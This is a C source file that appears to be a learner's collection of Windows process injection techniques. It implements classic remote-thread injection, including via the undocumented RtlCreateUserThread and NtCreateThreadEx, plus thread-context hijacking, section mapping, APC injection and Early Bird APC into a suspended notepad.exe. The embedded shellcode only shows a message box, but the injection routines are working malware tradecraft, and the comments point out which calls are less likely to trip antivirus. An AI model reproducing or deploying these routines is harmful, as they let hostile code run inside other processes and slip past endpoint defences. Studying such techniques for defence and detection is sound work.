/* 
 This file contains a collection of basic injection methods. As you go down the list of functions each function abuses a different
 part of the Windows API to inject and execute the shellcode. I will add more sophisticated methos as I learn them.
*/


#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

//shellcode for a simple message box

unsigned char shellcode[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
  0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
  0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
  0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
  0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
  0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
  0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
  0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
  0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
  0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
  0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
  0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
  0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
  0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
};
	
unsigned int shellcode_len = sizeof(shellcode);

//required for ntdll structures/functions

typedef enum _SECTION_INHERIT {
    ViewShare=1,
    ViewUnmap=2
} SECTION_INHERIT, *PSECTION_INHERIT;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI * RtlCreateUserThread_T) (
	HANDLE ProcessHandle,
	PSECURITY_DESCRIPTOR SecurityDescriptor,
	BOOLEAN CreateSuspended,
	ULONG StackZeroBits,
	OUT PULONG StackReserved,
	OUT PULONG StackCommit,
	PVOID StartAddress,
	PVOID StartParameter,
	PHANDLE ThreadHandle,
	PCLIENT_ID ClientID 
);
  
typedef NTSTATUS (NTAPI * NtCreateThreadEx_T) (
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID StartRoutine,
	PVOID Argument,
	ULONG CreateFlags,
	ULONG_PTR ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	PVOID AttributeList
);

typedef NTSTATUS (NTAPI * NtCreateSection_T) (
	PHANDLE SectionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER MaximumSize,
	ULONG SectionPageProtection,
	ULONG AllocationAttributes,
	HANDLE FileHandle
);

typedef NTSTATUS (NTAPI * NtMapViewOfSection_T) (
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	SECTION_INHERIT InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
);

//finds process ID using Tool Help Library
int FindProcess(char * pName){
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( hProcessSnap == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof( PROCESSENTRY32 );

	if( !Process32First( hProcessSnap, &pe32 )){
		CloseHandle(hProcessSnap);
		return NULL;
	}
	
	do {
				
		if(strcmpi(pName, pe32.szExeFile) == 0) return pe32.th32ProcessID;
		
	} while (Process32Next(hProcessSnap,&pe32));
		pe32.th32ProcessID;
		
	
	return 0;
}

//finds a thread ID
int FindThread(int PID) {
	
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE; 
	THREADENTRY32 te32; 
	
	hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 ); 
		if( hThreadSnap == INVALID_HANDLE_VALUE ) return 1; 
	
	te32.dwSize = sizeof(THREADENTRY32 ); 
 
	if( !Thread32First( hThreadSnap, &te32 ) ) return 1;

	do { 

    if( te32.th32OwnerProcessID == PID ) return te32.th32ThreadID;
	
  } while( Thread32Next(hThreadSnap, &te32 ) );
	
	return -1;
	
}

/*
 ---Arguments---
 hProcess: Handle of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 Method: Thread Execution Function.. 1 uses CreateRemoteThread, 2 uses RtlCreateUserThread, 3 uses NtCreateThreadEx
 ---------------
 
 This function injects into a process by: Allocating space -> Copying shellcode -> Start a thread pointing at the shellcode
*/
int InjectClassic(HANDLE hProcess, char * shellcode, int shellcode_len, int method){
	
	//init ntdll variables and functions
	CLIENT_ID cid;
	RtlCreateUserThread_T pRtlCreateUserThread = (RtlCreateUserThread_T) GetProcAddress(GetModuleHandle("NTDLL.DLL"),"RtlCreateUserThread");
	NtCreateThreadEx_T pNtCreateThreadEx = (NtCreateThreadEx_T) GetProcAddress(GetModuleHandle("NTDLL.DLL"),"NtCreateThreadEx");
	
	HANDLE hThread;
	
	LPVOID rem_exec;
	PDWORD oldProtect;
	
	//allocate, copy, then change protections 
	rem_exec = VirtualAllocEx(hProcess, 0, (DWORD) shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, rem_exec, shellcode, shellcode_len, 0);
	if (!VirtualProtectEx(hProcess, rem_exec, shellcode_len, PAGE_EXECUTE_READ, (PDWORD) &oldProtect)) return 1;
	
	//first method is the windows documented CreateRemoteThread
	//other two methods are NTDLL undocumented functions, probably less likely to be caught by an AV (although still very likely)
	switch(method){
		case 1:
			hThread = CreateRemoteThread(hProcess, 0,0, (LPTHREAD_START_ROUTINE) rem_exec,0,0,0);
			break;
		case 2:
			pRtlCreateUserThread(hProcess, 0, FALSE, 0, 0, 0, rem_exec, 0, &hThread, &cid);
			break;
		case 3:
			pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, 0, hProcess, (LPTHREAD_START_ROUTINE) rem_exec, 0, 0, 0, 0, 0 , 0);
			break;
	}
	
	if (!hThread) return 1;
	
	WaitForSingleObject(hThread, 500);
	return 0;

}
/*
 ---Arguments---
 hProcess: Handle of victim process
 PID: PID of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 ---------------
 
 This function allocates and copies the shellcode into the target process just as in classic injection, but 
 instead of creating a new thread it hijacks an existing threads and changes its instruction pointer to the
 newly allocated memory. This injection method likely crashes the process as the thread does not return back to 
 its normal execution.
*/
int InjectThreadContext(HANDLE hProcess, int PID, char * shellcode, int shellcode_len){

	LPVOID rem_exec;
	PDWORD oldProtect;
	
	int TID;
	HANDLE hThread;
	
	CONTEXT cx;
	
	//allocate, copy, then change protections 
	rem_exec = VirtualAllocEx(hProcess, 0, (DWORD) shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, rem_exec, shellcode, shellcode_len, 0);
	if (!VirtualProtectEx(hProcess, rem_exec, shellcode_len, PAGE_EXECUTE_READ, (PDWORD) &oldProtect)) return 1;
	
	//find a thread to inject
	TID = FindThread(PID);
	if (TID == -1) return 1;
	
	hThread = OpenThread( THREAD_ALL_ACCESS, 0, TID);
	if (!hThread) return 1;
	
	//
	if (SuspendThread(hThread) == -1) return 1;
	cx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext( hThread, &cx)) return 1;
		
	#ifdef _M_IX86 
		cx.Eip = (DWORD_PTR) rem_exec;
	#else
		cx.Rip = (DWORD_PTR) rem_exec;
	#endif
	
	if (!SetThreadContext( hThread, &cx)) return 1;
	if (ResumeThread(hThread) == -1) return 1;
	
	return 0;
}

/*
 ---Arguments---
 hProcess: Handle of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 ---------------
 
 This function creates a section which represents an area in memory which can be shared between processes. 
 Data in sections can only be read, written, or executed by processes (local or remote) with an object 
 called a view, which corresponds to the visible part of the section to that specific process. The shellcode
 is first written to the section using a local view by the local process, and then is executed by the remote
 process using a remote view. 
 */
int InjectSection (HANDLE hProcess, unsigned char * shellcode, unsigned int shellcode_len) {
	
	HANDLE sHandle = NULL;
	HANDLE hThread = NULL;
	PVOID viewAddress = NULL;
	PVOID remoteViewAddress = NULL;
	
	//create a section in the injecting process
	NtCreateSection_T pNtCreateSection = (NtCreateSection_T) GetProcAddress(GetModuleHandle("NTDLL.DLL"),"NtCreateSection");
	if (pNtCreateSection( &sHandle, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &shellcode_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0)) return 1;
	
	//create a view in the injecting process
	NtMapViewOfSection_T pNtMapViewOfSection = (NtMapViewOfSection_T) GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtMapViewOfSection");
	if (pNtMapViewOfSection( sHandle, GetCurrentProcess(), &viewAddress, NULL, NULL, NULL, (PSIZE_T) &shellcode_len, ViewUnmap, NULL, PAGE_READWRITE)) return 1;
	
	//copy the shellcode from .data(global var) to the view of the section
	memcpy(viewAddress, shellcode, shellcode_len);
	
	//create a remote view with execute rights pointing to the local section
	if (pNtMapViewOfSection( sHandle, hProcess, &remoteViewAddress, NULL, NULL, NULL, (PSIZE_T) &shellcode_len, ViewUnmap, NULL, PAGE_EXECUTE_READ)) return 1; 
	
	//create a new thread starting at the address of the view
	hThread = CreateRemoteThread(hProcess, 0,0, (LPTHREAD_START_ROUTINE) remoteViewAddress, 0,0,0);
	if (!hThread) return 1;

	WaitForSingleObject(hThread, 500);
	
	return 0;
}

/*
 ---Arguments---
 hProcess: Handle of victim process
 PID: PID of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 ---------------
 
 This function is quite simple. Windows supplies programs with the ability to queue functions for future use,
 this function is called an APC (Asynchronous Procedure Call). These functions are queued and executed within the context
 of a singular thread, this means the operating system needs to keep an APC queue for each thread. Once an APC function is queued, 
 it cannot be called unless the thread goes into an "alertable" state, as defined by the Windows operating system. This state
 can be achieved by a few Windows API functions such as SleepEx and SignalObjectAndWait, it can also be achieved by
 low level NT API calls that are not revealed by Windows.
 
 APC injection is useful because even though there is allocation and writing of memory, all execution calls to the thread actually come from the 
 system itself. Unlike all the methods above, we do not directly create or modify threads, instead modifying the APC queue.
 
 APC injection has two big issues:
 - Succesful execution of the APC queued function can likely crash the parent process, as the process has no way to recover where 
 it was previously. (At least in this implementation, i'm still a noob :) )
 - The injecting process has no way of forcing the victim thread to go into an alertable state without running one of the methods above,
 but if we do so it makes the whole approach useless as we are once again creating or modifiying a thread. The injected APC function is only
 executed when a user or the program somehow calls one the functions that cause an alertable state.
*/
int InjectAPC( HANDLE hProcess, int PID, unsigned char * shellcode, unsigned int shellcode_len) {
	
	//find and open a thread in a target process
	HANDLE hThread = NULL;
	int TID;
	LPVOID rem_exec;
	
	TID = FindThread(PID);
	if (TID == -1)
		return 1;
	
	hThread = OpenThread( THREAD_ALL_ACCESS, 0, TID);
		
	//inject the code into the process memory
	rem_exec = VirtualAllocEx(hProcess, 0, (DWORD) shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, rem_exec, shellcode, shellcode_len, 0);
	
	//insert the function into the APC queue of target thread
	if (!QueueUserAPC( (PAPCFUNC) rem_exec, hThread, NULL))
		return 1;
	
	return 0;
	
}

/*
 ---Arguments---
 hProcess: Name of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 ---------------
 
 This function uses identical methodology to the InjectAPC function. It abuses the APC queue to execute
 a malicious function injected into a remote process. Unlike InjectAPC however, it uses a technique called
 "Early Bird" to force the remote thread into an alertable state without actually interacting with it. Also
 unlike InjectAPC, it does not inject into an already existing process but instead creates a new process
 and exploits it. 
 
 How it works is quite interesting, at a high level it appears that each time a process is created,
 the APC queue is checked for its initial thread. My guess is that this is for programs that would like
 to utilize the APC queue to initialize some functions to run as soon as a process is executed.
 As a result an APC request which is placed before a process is created will lead to the that function 
 being immediatly executed on process start.
 
 Implementation wise it is quite simple, a process must be started in a suspended mode before 
 the malicious function is added to the APC queue, the process is then resumed to start execution, and 
 the first user code will be the malicious function.
*/
int InjectEarlyBird( char * processName , unsigned char * shellcode, unsigned int shellcode_len) {
	
	//
	LPVOID rem_exec;

	
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        "notepad.exe",        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        CREATE_SUSPENDED,   // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) return 1;
	
    // Allocate and copy shellcode	
	rem_exec = VirtualAllocEx( pi.hProcess, 0, (DWORD) shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory( pi.hProcess, rem_exec, shellcode, shellcode_len, 0);
	
	// Queue APC then resume the thread
	QueueUserAPC( (PAPCFUNC) rem_exec, pi.hThread, NULL);	
	
	ResumeThread( pi.hThread);

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}




int main(){

	//example
	char * processName = "notepad.exe";
	int PID = FindProcess(processName);
	HANDLE hProcess =  OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD) PID);
	
	/*
	if (!hProcess)
		return 1;
	
	if (InjectClassic(hProcess, shellcode, shellcode_len, 3))
		return 1;
	
	
	if (InjectThreadContext(hProcess, PID, shellcode, shellcode_len))
		return 1;
	
	if (InjectSection(hProcess, shellcode, shellcode_len))
		return 1;
	
	if (InjectAPC(hProcess, PID, shellcode, shellcode_len))
		return 1;
	
	if InjectEarlyBird( processName, shellcode, shellcode_len);
		return 1;
	*/

	return 0;

}
